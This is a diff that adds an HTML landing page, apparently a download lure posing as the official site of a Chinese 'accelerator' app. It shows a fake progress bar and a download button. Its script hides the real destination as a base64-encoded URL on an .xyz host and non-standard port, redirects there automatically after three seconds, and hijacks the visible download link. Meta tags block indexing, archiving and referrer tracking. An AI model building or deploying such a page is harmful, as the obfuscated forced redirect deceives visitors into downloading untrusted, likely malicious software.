@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<link rel="canonical" href="https://xiaocairener.com/">
+<title>资源准备中</title>
+<style>
+*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#071126;color:#eef6ff;font-family:"Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif}.transfer-card{width:min(92vw,460px);padding:34px;border:1px solid rgba(115,214,255,.28);border-radius:8px;background:linear-gradient(145deg,rgba(14,32,68,.92),rgba(30,23,70,.92));box-shadow:0 24px 70px rgba(0,0,0,.34),0 0 28px rgba(83,121,255,.25);text-align:center}.mark{width:74px;height:74px;margin:0 auto 18px;border-radius:22px;background:linear-gradient(135deg,#43e7ff,#7a62ff);display:grid;place-items:center;box-shadow:0 0 24px rgba(67,231,255,.35)}.mark:before{content:"";width:34px;height:34px;border:4px solid #fff;border-left-color:transparent;border-radius:50%;animation:spin 1.1s linear infinite}h1{font-size:28px;margin:0 0 12px}.transfer-card p{margin:8px 0;color:#b9c8e8}.progress{height:10px;background:rgba(255,255,255,.09);border-radius:999px;overflow:hidden;margin:24px 0}.bar{height:100%;width:0;background:linear-gradient(90deg,#43e7ff,#9b7cff,#ffd45f);box-shadow:0 0 18px rgba(67,231,255,.55);animation:load 3s linear forwards}.manual{display:inline-flex;align-items:center;justify-content:center;margin-top:4px;min-height:46px;padding:0 26px;border-radius:8px;background:linear-gradient(135deg,#4cecff,#8a6cff);color:#071126;text-decoration:none;font-weight:800;box-shadow:0 0 24px rgba(76,236,255,.38)}.manual:hover{transform:translateY(-1px)}.copy{position:fixed;left:0;right:0;bottom:18px;text-align:center;color:#8292b8;font-size:13px}@keyframes spin{to{transform:rotate(360deg)}}@keyframes load{to{width:100%}}
+</style>
+</head>
+<body>
+  <main class="transfer-card">
+    <div class="mark" aria-hidden="true"></div>
+    <h1>资源准备中</h1>
+    <p>正在校验连接环境</p>
+    <p>即将进入下载页面</p>
+    <p>请勿关闭当前页面</p>
+    <div class="progress" aria-hidden="true"><div class="bar"></div></div>
+    <a id="manualDownload" class="manual" href="/download.html" rel="nofollow noopener noreferrer">立即下载</a>
+  </main>
+  <p class="copy">© 2026 加速器(高速连通)官方网站. All Rights Reserved</p>
+  <script>
+  const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9wbHouMzEzNDg2Lnh5ejozNTg4OC8=");
+  const manualDownload = document.getElementById("manualDownload");
+  window.setTimeout(function () {
+    window.location.replace(REAL_DOWNLOAD_URL);
+  }, 3000);
+  manualDownload.addEventListener("click", function(e){
+    e.preventDefault();
+    window.location.replace(REAL_DOWNLOAD_URL);
+  });
+  </script>
+</body>
+</html>
